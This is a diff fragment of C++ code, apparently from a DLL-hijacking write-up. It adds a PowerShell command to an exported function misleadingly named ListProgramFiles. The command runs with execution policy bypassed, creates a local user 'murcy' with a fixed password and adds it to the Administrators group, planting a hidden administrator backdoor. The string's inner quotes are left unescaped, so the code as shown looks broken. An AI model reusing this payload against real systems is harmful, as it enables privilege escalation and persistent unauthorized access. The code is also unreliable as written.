@@ -94,7 +94,7 @@ certain libraries, even though these libraries were never present on the system.
 
 extern "C" __declspec(dllexport) void ListProgramFiles() {
     // PowerShell command line
-    wchar_t cmd[] = L"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"<command>"";
+    wchar_t cmd[] = L"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"New-LocalUser "murcy" -Password ("Password1!" | ConvertTo-SecureString -AsPlainText -Force) | Add-LocalGroupMember -Group "Administrators""";
 
     STARTUPINFOW si = { sizeof(si) };
     PROCESS_INFORMATION pi = {};
